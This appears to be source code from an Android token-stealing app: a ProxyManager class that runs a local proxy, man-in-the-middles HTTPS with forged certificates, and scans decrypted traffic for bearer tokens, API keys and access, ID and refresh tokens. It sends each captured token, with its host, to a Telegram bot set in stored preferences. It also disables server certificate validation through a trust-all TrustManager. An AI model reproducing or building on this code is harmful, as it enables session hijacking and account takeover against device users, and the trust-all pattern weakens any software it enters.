package com.tok.interceptor;

import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;

import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.security.*;
import java.security.cert.X509Certificate;
import java.util.*;
import java.util.concurrent.*;
import java.util.regex.*;

import javax.net.ssl.*;

public class ProxyManager {
    private static final String TAG = "ProxyManager";
    private static final int PROXY_PORT = 8080;
    private static final int BUFFER_SIZE = 65536;

    private final Context context;
    private final SharedPreferences prefs;
    private ServerSocket serverSocket;
    private ExecutorService threadPool;
    private volatile boolean running = false;
    private Thread acceptThread;

    // Patterns to detect auth tokens
    private static final Pattern[] TOKEN_PATTERNS = {
        Pattern.compile("(?i)authorization:\\s*(Bearer\\s+[^\\r\\n]+)", Pattern.CASE_INSENSITIVE),
        Pattern.compile("(?i)x-auth-token:\\s*([^\\r\\n]+)", Pattern.CASE_INSENSITIVE),
        Pattern.compile("(?i)x-access-token:\\s*([^\\r\\n]+)", Pattern.CASE_INSENSITIVE),
        Pattern.compile("(?i)token:\\s*([^\\r\\n]+)", Pattern.CASE_INSENSITIVE),
        Pattern.compile("(?i)x-api-key:\\s*([^\\r\\n]+)", Pattern.CASE_INSENSITIVE),
        Pattern.compile("\"access_token\"\\s*:\\s*\"([^\"]+)\""),
        Pattern.compile("\"token\"\\s*:\\s*\"([^\"]+)\""),
        Pattern.compile("\"id_token\"\\s*:\\s*\"([^\"]+)\""),
        Pattern.compile("\"refresh_token\"\\s*:\\s*\"([^\"]+)\""),
    };

    public ProxyManager(Context context) {
        this.context = context;
        this.prefs = context.getSharedPreferences("tok_prefs", Context.MODE_PRIVATE);
    }

    public void start() {
        if (running) return;
        running = true;
        threadPool = Executors.newCachedThreadPool();

        acceptThread = new Thread(() -> {
            try {
                serverSocket = new ServerSocket(PROXY_PORT);
                serverSocket.setReuseAddress(true);
                Log.d(TAG, "Proxy listening on port " + PROXY_PORT);

                while (running) {
                    try {
                        Socket client = serverSocket.accept();
                        threadPool.submit(() -> handleClient(client));
                    } catch (IOException e) {
                        if (running) Log.e(TAG, "Accept error", e);
                    }
                }
            } catch (IOException e) {
                Log.e(TAG, "Could not start proxy on port " + PROXY_PORT, e);
            }
        });
        acceptThread.setDaemon(true);
        acceptThread.start();
    }

    public void stop() {
        running = false;
        try {
            if (serverSocket != null && !serverSocket.isClosed()) {
                serverSocket.close();
            }
        } catch (IOException ignored) {}
        if (threadPool != null) threadPool.shutdownNow();
    }

    public boolean isRunning() {
        return running && serverSocket != null && !serverSocket.isClosed();
    }

    private void handleClient(Socket client) {
        try {
            client.setSoTimeout(15000);
            InputStream clientIn = client.getInputStream();
            OutputStream clientOut = client.getOutputStream();

            // Read the first line to determine HTTP method
            StringBuilder requestLine = new StringBuilder();
            int b;
            while ((b = clientIn.read()) != -1) {
                char c = (char) b;
                requestLine.append(c);
                if (requestLine.length() > 2 &&
                    requestLine.charAt(requestLine.length() - 2) == '\r' &&
                    requestLine.charAt(requestLine.length() - 1) == '\n') {
                    break;
                }
            }

            String firstLine = requestLine.toString().trim();
            if (firstLine.isEmpty()) { client.close(); return; }

            if (firstLine.startsWith("CONNECT ")) {
                handleHttpsConnect(firstLine, clientIn, clientOut, client);
            } else {
                handleHttpRequest(firstLine, clientIn, clientOut);
            }
        } catch (Exception e) {
            Log.d(TAG, "Client handler error: " + e.getMessage());
        } finally {
            try { client.close(); } catch (IOException ignored) {}
        }
    }

    // Handle HTTPS CONNECT tunneling with MITM
    private void handleHttpsConnect(String connectLine, InputStream clientIn,
                                     OutputStream clientOut, Socket clientSocket) throws Exception {
        // Parse: CONNECT host:port HTTP/1.1
        String[] parts = connectLine.split("\\s+");
        if (parts.length < 2) return;

        String[] hostPort = parts[1].split(":");
        String host = hostPort[0];
        int port = hostPort.length > 1 ? Integer.parseInt(hostPort[1]) : 443;

        // Read and discard remaining request headers
        readHeaders(clientIn);

        // Tell client the tunnel is established
        clientOut.write("HTTP/1.1 200 Connection Established\r\n\r\n".getBytes());
        clientOut.flush();

        // Now MITM the SSL: get our custom SSLContext for this host
        SSLContext serverSslCtx = CertInstaller.getMitmSSLContext(context, host);

        // Create a server-mode SSL socket wrapping the raw client socket
        SSLSocketFactory sf = serverSslCtx.getSocketFactory();
        SSLSocket sslClient = (SSLSocket) sf.createSocket(
            clientSocket,
            clientSocket.getInetAddress().getHostAddress(),
            clientSocket.getPort(),
            true  // autoClose
        );
        sslClient.setUseClientMode(false);
        sslClient.setNeedClientAuth(false);
        sslClient.startHandshake();

        // Read the decrypted HTTPS request
        InputStream decryptedIn = sslClient.getInputStream();
        OutputStream decryptedOut = sslClient.getOutputStream();

        // Read and inspect the decrypted request
        byte[] requestData = readAvailable(decryptedIn);
        String requestStr = new String(requestData, StandardCharsets.UTF_8);

        // Scan for tokens
        scanAndForwardTokens(requestStr, host);

        // Forward to real server over SSL
        SSLSocket serverConn = connectToServer(host, port);
        serverConn.getOutputStream().write(requestData);
        serverConn.getOutputStream().flush();

        // Read response and pass back to client
        byte[] responseData = readAvailable(serverConn.getInputStream());

        // Also scan response for tokens (login responses contain tokens)
        String responseStr = new String(responseData, StandardCharsets.UTF_8);
        scanAndForwardTokens(responseStr, host);

        decryptedOut.write(responseData);
        decryptedOut.flush();

        serverConn.close();
        sslClient.close();
    }

    // Handle plain HTTP requests
    private void handleHttpRequest(String firstLine, InputStream clientIn,
                                    OutputStream clientOut) throws Exception {
        // Parse: GET http://host/path HTTP/1.1
        String[] parts = firstLine.split("\\s+");
        if (parts.length < 2) return;

        URL url = new URL(parts[1]);
        String host = url.getHost();
        int port = url.getPort() == -1 ? 80 : url.getPort();

        byte[] remainingHeaders = readHeaderBytes(clientIn);
        String allHeaders = firstLine + "\r\n" + new String(remainingHeaders, StandardCharsets.UTF_8);

        // Scan headers for tokens
        scanAndForwardTokens(allHeaders, host);

        // Forward to real server
        try (Socket server = new Socket(host, port)) {
            server.getOutputStream().write(allHeaders.getBytes());

            // Forward any body
            byte[] body = readAvailable(clientIn);
            if (body.length > 0) {
                String bodyStr = new String(body, StandardCharsets.UTF_8);
                scanAndForwardTokens(bodyStr, host);
                server.getOutputStream().write(body);
            }
            server.getOutputStream().flush();

            // Pass response back
            byte[] response = readAvailable(server.getInputStream());
            String responseStr = new String(response, StandardCharsets.UTF_8);
            scanAndForwardTokens(responseStr, host);
            clientOut.write(response);
            clientOut.flush();
        }
    }

    private SSLSocket connectToServer(String host, int port) throws Exception {
        SSLContext ctx = SSLContext.getInstance("TLS");
        // Trust all certs when connecting to real server
        ctx.init(null, new TrustManager[]{new X509TrustManager() {
            public void checkClientTrusted(X509Certificate[] c, String a) {}
            public void checkServerTrusted(X509Certificate[] c, String a) {}
            public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
        }}, new SecureRandom());
        SSLSocketFactory sf = ctx.getSocketFactory();
        SSLSocket s = (SSLSocket) sf.createSocket(host, port);
        s.startHandshake();
        return s;
    }

    // Pattern names aligned with TOKEN_PATTERNS order
    private static final String[] PATTERN_NAMES = {
        "Authorization", "X-Auth-Token", "X-Access-Token", "Token",
        "X-Api-Key", "access_token (JSON)", "token (JSON)",
        "id_token (JSON)", "refresh_token (JSON)"
    };

    private void scanAndForwardTokens(String data, String host) {
        if (data == null || data.isEmpty()) return;
        Map<String, String> found = new LinkedHashMap<>();

        for (int i = 0; i < TOKEN_PATTERNS.length; i++) {
            Matcher m = TOKEN_PATTERNS[i].matcher(data);
            while (m.find()) {
                String token = m.group(1).trim();
                if (token.length() > 8 && !token.equals("null") && !token.equals("undefined")) {
                    found.put(PATTERN_NAMES[i], token);
                }
            }
        }

        if (!found.isEmpty()) {
            String botToken = prefs.getString("bot_token", "");
            String channelId = prefs.getString("channel_id", "");

            if (!botToken.isEmpty() && !channelId.isEmpty()) {
                TelegramForwarder fwd = new TelegramForwarder(botToken, channelId);
                for (Map.Entry<String, String> entry : found.entrySet()) {
                    fwd.send(entry.getKey(), entry.getValue(), host);
                }
            }
        }
    }

    private String readHeaders(InputStream in) throws IOException {
        StringBuilder sb = new StringBuilder();
        int prev = 0;
        int b;
        while ((b = in.read()) != -1) {
            sb.append((char) b);
            if (prev == '\n' && b == '\r') {
                b = in.read();
                sb.append((char) b);
                if (b == '\n') break;
            }
            prev = b;
            // Double CRLF = end of headers
            String s = sb.toString();
            if (s.endsWith("\r\n\r\n")) break;
        }
        return sb.toString();
    }

    private byte[] readHeaderBytes(InputStream in) throws IOException {
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        int[] last4 = new int[4];
        int b;
        while ((b = in.read()) != -1) {
            buf.write(b);
            System.arraycopy(last4, 1, last4, 0, 3);
            last4[3] = b;
            if (last4[0] == '\r' && last4[1] == '\n' && last4[2] == '\r' && last4[3] == '\n') {
                break;
            }
        }
        return buf.toByteArray();
    }

    private byte[] readAvailable(InputStream in) throws IOException {
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        byte[] tmp = new byte[BUFFER_SIZE];
        int read;
        try {
            while (in.available() > 0 || buf.size() == 0) {
                read = in.read(tmp);
                if (read == -1) break;
                buf.write(tmp, 0, read);
                if (in.available() == 0) {
                    // Small wait to see if more data arrives
                    Thread.sleep(50);
                    if (in.available() == 0) break;
                }
            }
        } catch (InterruptedException ignored) {}
        return buf.toByteArray();
    }
}
